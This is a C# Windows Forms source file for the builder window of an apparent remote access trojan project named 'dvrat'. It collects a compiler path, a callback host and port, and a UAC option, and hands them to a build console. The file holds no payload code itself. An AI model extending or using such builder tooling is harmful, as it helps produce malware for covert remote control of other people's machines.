using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace dvrat
{
    public partial class BuilderForm : Form
    {
        public BuilderForm()
        {
            InitializeComponent();
        }

        private void exit_label_Click(object sender, EventArgs e) => this.Close();

        private void builder_form_Load(object sender, EventArgs e)
        {
            this.compiler_path = compiler_textBox.Text;
        }

        private void header_label_Click(object sender, EventArgs e)
        {

        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();


        private string compiler_path = "";
        private string proj_path = "";

        private void header_label_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void exit_label_MouseHover(object sender, EventArgs e)
        {
            this.exit_label.BackColor = Color.Red;
        }

        private void exit_label_MouseLeave(object sender, EventArgs e)
        {
            this.exit_label.BackColor = Color.FromArgb(64, 64, 64);
        }

        private void build_button_Click(object sender, EventArgs e)
        {
            ConsoleForm cnsl_frm = new ConsoleForm();
            this.Hide();
            cnsl_frm.compiler = this.compiler_path;
            cnsl_frm.proj_path = this.proj_path;
            cnsl_frm.use_UAC = true ? uac_checkBox1.Checked : false;
            cnsl_frm.HOST = host_textBox.Text;
            cnsl_frm.PORT = (int)port_numericUpDown1.Value;
            cnsl_frm.ShowDialog();
        }

  
        private void compiler_path_linkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            using (OpenFileDialog x = new OpenFileDialog())
            {
                x.Filter = "exe file (*.exe)|*.exe";
                if (x.ShowDialog() == DialogResult.OK)
                {
                    this.compiler_path = x.FileName;
                    compiler_textBox.Text = this.compiler_path;
                }
                else
                {
                }
            }
        }
    }
}
